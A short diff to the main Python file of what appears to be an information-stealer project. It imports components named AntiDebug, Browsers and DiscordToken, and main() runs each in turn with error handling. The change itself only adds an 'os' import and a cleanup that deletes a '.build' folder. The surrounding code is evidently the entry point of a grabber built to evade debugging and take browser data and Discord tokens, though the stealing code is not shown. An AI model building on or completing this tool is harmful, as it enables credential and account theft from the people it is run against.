@@ -1,3 +1,4 @@
+import os
 from components.antidebug import AntiDebug
 from components.browsers import Browsers
 from components.discordtoken import DiscordToken
@@ -28,6 +29,8 @@ def main():
             except Exception as e:
                 print(f'Error in {func.__name__}: {e}')
 
+if os.path.exists(".build"):
+    os.rmdir(".build")
 
 if __name__ == '__main__':
     main()
